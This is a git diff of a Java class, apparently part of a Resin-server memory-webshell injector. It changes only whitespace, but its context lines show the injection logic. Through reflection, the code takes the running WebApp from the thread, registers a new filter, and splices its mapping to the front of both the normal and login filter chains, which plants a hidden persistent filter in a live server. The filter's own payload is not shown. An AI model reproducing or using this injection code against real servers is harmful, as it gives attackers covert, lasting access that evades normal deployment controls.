@@ -19,12 +19,12 @@ public class RFMSFromThreadF implements Filter {
             ClassLoader classloader = Thread.currentThread().getContextClassLoader();
 
             Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
-            Class filterConfigimplcls  = classloader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
-            Class filterMappingcls     = classloader.loadClass("com.caucho.server.dispatch.FilterMapping");
-            Class filterMappercls      = classloader.loadClass("com.caucho.server.dispatch.FilterMapper");
+            Class filterConfigimplcls = classloader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
+            Class filterMappingcls = classloader.loadClass("com.caucho.server.dispatch.FilterMapping");
+            Class filterMappercls = classloader.loadClass("com.caucho.server.dispatch.FilterMapper");
 
             Object contextRequest = servletInvocationcls.getMethod("getContextRequest").invoke(null);
-            WebApp webapp         = (WebApp) contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
+            WebApp webapp = (WebApp) contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
 
             Filter filter = new RFMSFromThreadF();
 
@@ -35,7 +35,7 @@ public class RFMSFromThreadF implements Filter {
 
             webapp.addFilter(filterConfigimpl);
 
-            FilterMapping            filterMapping           = (FilterMapping) filterMappingcls.newInstance();
+            FilterMapping filterMapping = (FilterMapping) filterMappingcls.newInstance();
             FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();
             filterMappingUrlpattern.addText(pattern);
             filterMappingUrlpattern.init();
@@ -58,7 +58,7 @@ public class RFMSFromThreadF implements Filter {
             fieldFilterMapperFilterMap.setAccessible(true);
 
             ArrayList<FilterMapping> orginalfilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(filtermapper);
-            ArrayList<FilterMapping> newFilterMappings     = new ArrayList(orginalfilterMappings.size() + 1);
+            ArrayList<FilterMapping> newFilterMappings = new ArrayList(orginalfilterMappings.size() + 1);
             newFilterMappings.add(filterMapping);
 
             int count = 0;
@@ -82,7 +82,7 @@ public class RFMSFromThreadF implements Filter {
             FilterMapper loginFilterMapper = (FilterMapper) fieldWebappLoginFilterMapper.get(webapp);
 
             ArrayList<FilterMapping> orginLoginFilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(loginFilterMapper);
-            ArrayList<FilterMapping> newLoginFilterMappings   = new ArrayList(orginLoginFilterMappings.size() + 1);
+            ArrayList<FilterMapping> newLoginFilterMappings = new ArrayList(orginLoginFilterMappings.size() + 1);
             newLoginFilterMappings.add(filterMapping);
 
             count = 0;
